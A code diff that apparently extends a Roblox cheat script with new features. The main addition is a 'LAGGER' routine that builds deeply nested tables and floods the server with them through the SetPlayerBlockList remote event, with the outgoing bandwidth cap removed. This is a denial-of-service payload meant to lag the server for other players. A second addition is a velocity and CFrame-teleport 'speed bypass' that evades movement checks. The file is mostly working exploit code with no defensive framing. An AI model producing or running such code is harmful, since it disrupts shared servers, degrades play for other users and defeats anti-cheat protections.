@@ -3346,24 +3346,96 @@ function createRightButtons(device)
         LaggerStroke.Thickness = 2
         LaggerStroke.Parent = LaggerButton
 
+        -- LAGGER logic (no extra GUI, just logic)
+        local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+        local LAGGER_CONFIG = isMobile and {
+            TableIncrease = 290,
+            Tries = 1,
+            LoopWaitTime = 0.85
+        } or {
+            TableIncrease = 265,
+            Tries = 1,
+            LoopWaitTime = 0.05
+        }
+        local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+        local function resolveRemote(path)
+            if not path or path == "" then return nil end
+            local obj = game
+            local cleaned = path:gsub("^game%.", "")
+            for segment in cleaned:gmatch("[^%.]+") do
+                if obj then
+                    obj = obj[segment]
+                else
+                    return nil
+                end
+            end
+            return obj
+        end
+        local function getmaxvalue(val)
+            local mainvalueifonetable = 499999
+            if type(val) ~= "number" then return nil end
+            return mainvalueifonetable / (val + 2)
+        end
+        local function bomb(tableincrease, tries)
+            local maintable = {}
+            local spammedtable = {}
+            table.insert(spammedtable, {})
+            local z = spammedtable[1]
+            for i = 1, tableincrease do
+                local tableins = {}
+                table.insert(z, tableins)
+                z = tableins
+            end
+            local maximum = getmaxvalue(tableincrease) or 9999999
+            for i = 1, maximum do
+                table.insert(maintable, spammedtable)
+                if i % 5000 == 0 then task.wait() end
+            end
+            local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+            if remote then
+                for i = 1, tries do
+                    pcall(function()
+                        if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                            remote:FireServer(maintable)
+                        elseif remote:IsA("RemoteFunction") then
+                            remote:InvokeServer(maintable)
+                        end
+                    end)
+                end
+            end
+        end
+        local laggerEnabled = false
+        local laggerThread = nil
+        local function startLaggerLoop()
+            while laggerEnabled do
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+                task.spawn(function()
+                    bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
+                end)
+                task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+            end
+        end
+        local function stopLaggerLoop()
+            laggerEnabled = false
+            if laggerThread then
+                coroutine.close(laggerThread)
+                laggerThread = nil
+            end
+        end
+        local function startLagger()
+            if laggerThread then return end
+            laggerEnabled = true
+            laggerThread = coroutine.create(startLaggerLoop)
+            coroutine.resume(laggerThread)
+        end
         LaggerButton.MouseButton1Click:Connect(function()
             laggerEnabled = not laggerEnabled
             if laggerEnabled then
                 LaggerButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-                -- Desync all other players (lag their speed)
-                for _, plr in ipairs(Players:GetPlayers()) do
-                    if plr ~= player and plr.Character and plr.Character:FindFirstChild("Humanoid") then
-                        if raknet and raknet.desync then pcall(function() raknet.desync(true, plr) end) end
-                    end
-                end
+                startLagger()
             else
                 LaggerButton.BackgroundColor3 = Color3.fromRGB(70, 70, 75)
-                -- Restore all other players
-                for _, plr in ipairs(Players:GetPlayers()) do
-                    if plr ~= player and plr.Character and plr.Character:FindFirstChild("Humanoid") then
-                        if raknet and raknet.desync then pcall(function() raknet.desync(false, plr) end) end
-                    end
-                end
+                stopLaggerLoop()
             end
         end)
     local function getHumanoid()
@@ -3392,18 +3464,38 @@ function createRightButtons(device)
             prevSpin = SpinBotEnabled
             prevPath = StealPathEnabled
             prevAimbot = batAimbotToggled
-            -- Set to StealSpeed walk
+            -- Disable all other speed/teleport/laggy features
             if SpeedBooster then SpeedBooster.Enabled = false end
             if SpinBotEnabled then SpinBotEnabled = false end
             if StealPathEnabled then StealPathEnabled = false end
             if batAimbotToggled then batAimbotToggled = false end
-            humanoid.WalkSpeed = getStealSpeed()
             humanoid.JumpPower = 50
             stopAnims(humanoid)
             if animConnection then animConnection:Disconnect() animConnection = nil end
             animConnection = humanoid.AnimationPlayed:Connect(function(t) t:Stop() end)
             if raknet and raknet.desync then raknet.desync(true) end
             setOtherPlayersDesync(false)
+            -- High-tech speed bypass logic (SAB):
+            local desyncConn
+            desyncConn = RunService.Heartbeat:Connect(function()
+                if not desyncEnabled or not player.Character or not humanoid or humanoid.Health <= 0 then if desyncConn then desyncConn:Disconnect() end return end
+                local r = player.Character:FindFirstChild("HumanoidRootPart")
+                if not r then return end
+                if humanoid.MoveDirection.Magnitude > 0 then
+                    local vel = getStealSpeed()
+                    -- True bypass: if lag-back detected, use CFrame teleport
+                    if math.abs(r.AssemblyLinearVelocity.X) < 1 and math.abs(r.AssemblyLinearVelocity.Z) < 1 and humanoid.MoveDirection.Magnitude > 0.1 then
+                        r.CFrame = r.CFrame + Vector3.new(humanoid.MoveDirection.X * 2, 0, humanoid.MoveDirection.Z * 2)
+                        r.AssemblyLinearVelocity = Vector3.zero
+                    else
+                        r.AssemblyLinearVelocity = Vector3.new(humanoid.MoveDirection.X * vel, r.AssemblyLinearVelocity.Y, humanoid.MoveDirection.Z * vel)
+                    end
+                else
+                    r.AssemblyLinearVelocity = Vector3.zero
+                end
+            end)
+            -- Store for disconnect on disable
+            DesyncButton._desyncConn = desyncConn
         else
             DesyncButton.BackgroundColor3 = Color3.fromRGB(70, 70, 75)
             -- Restore previous states
@@ -3416,6 +3508,12 @@ function createRightButtons(device)
             if animConnection then animConnection:Disconnect() animConnection = nil end
             if raknet and raknet.desync then raknet.desync(false) end
             setOtherPlayersDesync(false)
+            -- Disconnect speed bypass
+            if DesyncButton._desyncConn then DesyncButton._desyncConn:Disconnect() DesyncButton._desyncConn = nil end
+            -- Reset velocity
+            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                player.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
+            end
         end
     end)
 
